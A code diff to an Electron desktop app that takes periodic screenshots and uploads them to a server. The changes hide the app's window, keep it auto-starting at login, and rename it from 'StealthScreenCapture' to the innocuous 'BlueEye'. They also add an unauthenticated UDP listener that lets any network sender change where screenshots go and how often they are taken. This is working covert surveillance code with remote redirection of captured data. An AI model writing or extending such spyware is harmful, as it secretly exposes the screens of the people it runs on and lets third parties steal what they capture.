@@ -7,10 +7,12 @@ const axios = require('axios');
 const sharp = require('sharp');
 const config = require('./config.json');
 const { powerMonitor } = require('electron');
+const dgram = require('dgram');
+const client = dgram.createSocket('udp4');
 
 let tray = null;
 let win = null;
-let uploadUrl = config.uploadUrl;
+let { serverIP, intervalMs, apiPort } = config;
 
 function setTrayStatus(color = 'gray') {
   const iconPath = path.join(__dirname, 'assets', `icon-${color}.png`);
@@ -60,7 +62,7 @@ async function captureAndUpload() {
     const idleTime = powerMonitor.getSystemIdleTime();
     const isActive = idleTime < (config.idleThreshold || 3);
 
-    await axios.post(uploadUrl, compressed, {
+    await axios.post(`http://${serverIP}:${apiPort}/client/upload`, compressed, {
       headers: {
         'Content-Type': 'image/webp',
         'X-Username': username,
@@ -78,10 +80,6 @@ async function captureAndUpload() {
   }
 }
 
-ipcMain.on('set-upload-url', (event, url) => {
-  uploadUrl = `http://${url}:8923/client/upload`;
-});
-
 ipcMain.on('hide-window', () => {
   if (win && !win.isDestroyed()) win.hide();
 });
@@ -92,7 +90,7 @@ app.whenReady().then(() => {
   win = new BrowserWindow({
     width: 400,
     height: 300,
-    show: true,
+    show: false,
     frame: true,
     skipTaskbar: true,
     webPreferences: {
@@ -106,12 +104,25 @@ app.whenReady().then(() => {
   setTrayStatus('gray'); // initial
   // tray.setToolTip('Connection not started.');
 
-  win.loadFile('index.html');
+  // win.loadFile('index.html');
+  // win.webContents.openDevTools();
 
-  const autoLauncher = new AutoLaunch({ name: 'StealthScreenCapture' });
+  const autoLauncher = new AutoLaunch({ name: 'BlueEye' });
   autoLauncher.isEnabled().then(enabled => {
     if (!enabled) autoLauncher.enable();
   });
 
-  setInterval(captureAndUpload, config.intervalMs || 60000);
+  setInterval(captureAndUpload, intervalMs || 60000);
+});
+
+client.bind(config.port);
+
+client.on('message', (msg, rinfo) => {
+  const response = msg.toString();
+  if (response) {
+    const jsonData = JSON.parse(response);
+    serverIP = jsonData.SERVER_IP_ADDRESS || config.serverIP;
+    intervalMs = jsonData.CLIENT_SCREENSHOT_INTERVAL || config.intervalMs;
+    apiPort = jsonData.CLIENT_API_PORT || config.apiPort;
+  }
 });
